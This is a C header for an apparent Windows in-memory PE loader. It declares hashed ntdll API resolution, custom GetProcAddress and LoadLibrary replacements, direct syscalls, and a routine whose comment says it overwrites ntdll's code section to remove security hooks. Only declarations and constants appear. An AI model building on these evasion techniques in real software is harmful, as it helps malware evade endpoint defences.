/*
	this file contains the common functions called, as well other stuff (macros, typedefs ...)
*/

#pragma once

#include <Windows.h>

#ifndef COMMON
#define COMMON

#include "Structs.h"

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// macros:


#define SEED 0x07

#define DEREF( name )		*(	UINT_PTR	*)	(name)
#define DEREF_64( name )	*(	DWORD64		*)	(name)
#define DEREF_32( name )	*(	DWORD		*)	(name)
#define DEREF_16( name )	*(	WORD		*)	(name)
#define DEREF_8( name )		*(	BYTE		*)	(name)

#define HASH(API)		(_HashStringRotr32A((PCHAR) API))


#define NTDLLDLLA								"NTDLL.DLL"
#define NTDLLDLLW								L"NTDLL.DLL"
#define KERNEL32DLL								"KERNEL32.DLL"


#define ATOM_StrHashed							0x9F520B2D

#define NtAllocateVirtualMemory_StrHashed       0x014044AE
#define NtProtectVirtualMemory_StrHashed        0xE67C7320
#define NtCreateSection_StrHashed				0xAC2EDA02
#define NtOpenSection_StrHashed					0xD443EC8C
#define NtMapViewOfSection_StrHashed			0x92DD00B3
#define NtUnmapViewOfSection_StrHashed			0x12D71086
#define NtClose_StrHashed						0x7B3F64A4

#define LdrLoadDll_StrHashed					0xCC4C8B22
#define RtlAddFunctionTable_StrHashed			0x9219585C


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// typedefs:


typedef NTSTATUS(NTAPI* fnLdrLoadDll)(
	PWCHAR             PathToFile,
	ULONG              Flags,
	PUNICODE_STRING    ModuleFileName,
	PHANDLE            ModuleHandle
	);

typedef BOOLEAN(WINAPI* fnRtlAddFunctionTable)(
	PRUNTIME_FUNCTION FunctionTable,
	DWORD             EntryCount,
	DWORD64           BaseAddress
	);


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Unpack.c (255):

VOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe);



//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Utils.c:


// fill up the direct syscalls struct (using a function from my Syscallslib library)
BOOL InitializeDirectNtCalls();
// overwrite the .txt section of ntdll.dll (copied from \knowndll\) to unhook ...
BOOL RefreshNtdll();

// custom getmodulehandlea
HMODULE GetModuleHandleH(LPSTR ModuleName);
// custom loadlibrarya (using LdrLoadDll)
HMODULE LoadLibraryH(LPSTR DllName);
// custom getprocaddress (via hashing)
FARPROC GetProcAddressH(HMODULE hModule, DWORD Hash);


//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// General.c

/*
	these are helper functions, used to avoid crt functions  ...
*/

VOID		_RtlInitUnicodeString(PUNICODE_STRING target, PCWSTR source);
SIZE_T		_CharToWchar(PWCHAR Destination, PCHAR Source, SIZE_T MaximumAllowed);

wchar_t*	_strcatW(wchar_t* dest, const wchar_t* src);
wchar_t*	_strcpyW(wchar_t* dest, const wchar_t* src);
char*		_strcatA(char* dest, const char* src);
char*		_strcpyA(char* dest, const char* src);

SIZE_T		_StrlenA(LPCSTR String);
SIZE_T		_StrlenW(LPCWSTR String);

DWORD		_HashStringRotr32A(PCHAR String);
VOID		_ZeroMemory(PVOID Destination, SIZE_T Size);
PVOID		_memcpy(void* dst, const void* src, SIZE_T count);
CHAR		_ToUpper(CHAR c);
UINT32		_CopyDotStr(PCHAR String);

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------



#endif // !COMMON
